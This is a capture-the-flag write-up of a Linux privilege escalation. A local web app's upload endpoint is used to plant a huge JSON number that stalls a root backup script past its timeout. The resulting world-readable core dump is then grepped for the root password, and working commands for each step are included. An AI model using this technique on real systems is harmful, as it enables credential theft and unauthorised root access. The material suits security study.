I did not know I had to do it in 15 minutes so I had to write it from 0.

**Challenge Scenario**
```
Can you privesc? I can't hear youuuuuuu.

Aye aye sysadmiiinnnnnnn.

A legacy internal note-taking service is running on this box. You've been handed low-privilege SSH access to poke around - what you do with it is up to you.

Creds:
sys4dmin
adminpass

The note-taking web app itself is only reachable from inside the box (`127.0.0.1:8080`) - it is not exposed on the internet. Everything you need to reach it is available once you're on the host.

Please keep your notes.
```


I am given an IP address to ssh to the box with the credentials and a website holding what I think is a clone of the actual note taking webapp found on the target

## Web Enumeration 

By looking through the webapp I found that it allows only one connection at a time and it gives a cookie `mdsession` being a single global session cookie, meaning that without that cookie you can't access the website 

Looking through the website I saw how it operates, how the notetaking process happens and after that I continued by with the target

## First Access

After I entered the target and while looking through it I found some valuable info with the help of `ps aux | grep "."`
- I found that there are 2 processes owned by root which by the name of the directory `s3cr3t_py_dir` made me suspect it for being the next target
- The script is the webapp
- Also a cronjob seems to be present
```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  
root           1  0.0  0.0  14244 10216 ?        Ss   13:30   0:00 /usr/local/bin/python /var/run/s3cr3t_py_d1r/webapp.py  
root           8  0.0  0.0   5724  2108 ?        S    13:30   0:00 /bin/bash -c /usr/sbin/cron && /usr/sbin/sshd -D & exec /usr/local/bin/python /var/run/s3cr3t_py_d1r/webapp.py
```

Next I have to check the secret python folder and also the cronjob to see what I am dealing with

The `s3cr3_py_dir` directory holds 3 files:
- `webapp.py` the source code for the website 
- `backup.py` and `backup.sh` which are related with one another

`backup.sh` launches `backup.py` as a background process and installs a trap, such that if it gets a `SIGQUIT` signal, then `ptrace_dump()` which runs `gcore` on the still-live Python process, moves the result to `/tmp/memdump_<pid>.core`, and **`chmod 0644`s it** making a root process's full memory image world-readable

Also inside the backup.py process we can learn that the ROOT_PASSWORD will be extracted from the `/root/.env` file
- That variable stays live in the process's heap for as long as the process runs
```python
env = load_env()  # reads /root/.env
root_password = env.get('ROOT_PASSWORD', '')
```

So if we manage to send a `SIGQUIT` signal then the process memory will be dumped and we will be able to read the ROOT_PASSWORD from the `memdump_<pid>.core` file

Also using the following bash script:
```bash
cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; for f in /etc/cron.d/*; do echo "== $f =="; cat "$f"; done 2>/dev/null
```
- We can learn more about the previously uncovered cronjob and what it does

As output we get the following:
```bash
*/2 * * * * root cd /tmp && /usr/bin/timeout --signal=QUIT --kill-after=5s 10s /var/run/s3cr3t_py_d1r/backup.sh
```
- Firstly the script runs from 2 to 2 minutes and it does exactly what we need
- If the process `backup.sh` is taking too long (more than 10s) then it sends a `SIGQUIT` signal

## Exploitation

To ensure that the `backup.sh` will take longer than 10 seconds to ensure the quitting condition we need to force the `backup.py` run long enough
 - We can do this by slowing down the process, because it loops over every `*.json` files in `/app/notes` (the webapp location) and it calls `json.loads()`, we can put a very large input in a new `.json` file
- For that, I found on web that CPython 2.7 converts a long decimal-digit string to an `int` with a schoolbook O(n²) algorithm (only fixed for this in Python 3.11+), resulting in the discovery that  a multi-million-digit JSON number takes CPython a very long time to parse

Since we can't put the `.json` file directly in `/app/notes` we need to use the local endpoint for the webapp to upload a file containing a big number

Knowing how to exploit the app we can try to do it:
1. Craft a payload note that will stall `backup.py`'s JSON parser long enough to blow past the 10-second `timeout` watchdog.
```bash
python2 -c "import sys; sys.stdout.write('9'*2000000)" > not.json
```
2. Use the web app's `/upload` endpoint to upload the file inside the `/app/notes` directory having the global session cookie
	- First get the cookie:
```bash
curl -s -c cookie.txt -i http://127.0.0.1:8080/
```
- Upload the file
```bash
curl -s -b cookie.txt --data-binary @not.json http://127.0.0.1:8080/upload
```
3. Wait out the next cron tick and poll for the dump:
```bash
while true; do 
	f=$(ls /tmp/memdump_*.core 2>/dev/null | head -1) 
	[ -n "$f" ] && echo "Got: $f" && break 
	sleep 2 
done
```
- Within the next 2 minutes the `backup.py` scripts takes the `not.json` file and will load the whole number, but since it is very big it will take longer than 10 seconds, hence the `SIGQUIT` signal will be delivered and the `backup.sh`'s trap dumped its memory to a world-readable `/tmp/memdump_<pid>.core`
4. Pull the credential straight out of the core dump:
```bash
cat memdump_213.core | grep -a "ROOT"
```

Having the `ROOT_PASSWORD=3219b1e0c668294cafd1eaf592b3fe2d` I can ssh inside the `root` account and find the `flag.txt` file

